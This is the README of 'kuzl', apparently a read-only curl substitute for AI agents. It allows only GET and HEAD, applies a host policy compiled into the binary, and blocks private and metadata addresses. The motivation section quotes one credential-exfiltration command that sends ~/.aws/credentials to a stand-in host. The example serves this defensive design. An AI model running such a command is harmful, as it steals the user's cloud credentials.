# kuzl

A read-only `curl` for AI agents: GET and HEAD only, nothing local is ever
sent, and where requests may go is set by a policy built into the binary,
not by the command line or the environment.

kuzl is to `curl` what [ghzt](https://github.com/evadcmd/ghzt) is to `gh`
and `git`: one binary, symlinked as `curl`, that an agent can be allowed to
run with a plain `Bash(curl:*)` prefix rule. The real curl can't be: once it
is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
and sends it out in one call.

The design and roadmap live in
[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 and 2 are in: the
skeleton and the network policy (`internal/netguard`). The `curl` command
doesn't fetch anything yet; that is step 3.

## Testing locally

```sh
make build   # builds policy.yaml in; POLICY=other.yaml for another, POLICY= for none
bin/kuzl policy
bin/kuzl curl --help
```

`bin/` is gitignored. Run as `kuzl`, the binary has `curl` as a subcommand,
so no symlink is needed for testing. Don't put `bin/` on your `PATH` once it
has a `curl` symlink: it would shadow the real one.

### Network policy

The policy is a YAML file built into the binary, so an agent running kuzl
can't change it. [`policy.yaml`](policy.yaml) is the one `make build` uses,
with the reason for each entry; `make build POLICY=...` builds another file
in instead. The keys:

- `allow_hosts`: the only hosts allowed. `example.com` matches that host
  only, `"*.example.com"` its subdomains (not `example.com` itself), and
  `"*"` every public host. Quote entries starting with `*`: unquoted, YAML
  reads them as an alias.
- `deny_hosts`: hosts refused, even if `allow_hosts` matches them.
- `deny_addrs`: IPs and CIDR prefixes never dialed, checked on the address a
  name resolves to.

Every key may be left out. A host not in `allow_hosts` is refused, so with
`allow_hosts` left out, empty or null, and with no policy built in
(`POLICY=`), every host is. An unknown key, a value of the wrong type or an
invalid entry is an error, reported with its line, rather than skipped.
`make build` runs `bin/kuzl policy`, which prints the policy as kuzl reads
it, and fails the build if it doesn't validate.

Whatever the policy says, only http and https URLs without credentials are
fetched, and only public addresses are dialed: loopback, private, link-local
(the cloud metadata endpoint included), CGNAT and the other special-purpose
ranges are refused, on the address actually connected to. `HTTP(S)_PROXY` is
ignored.

### Environment

- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
  to the working directory.
- Telemetry stays off unless an OTLP endpoint is set
  (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).

### Unit tests

```sh
go vet ./...
go test -race ./...
golangci-lint run
```
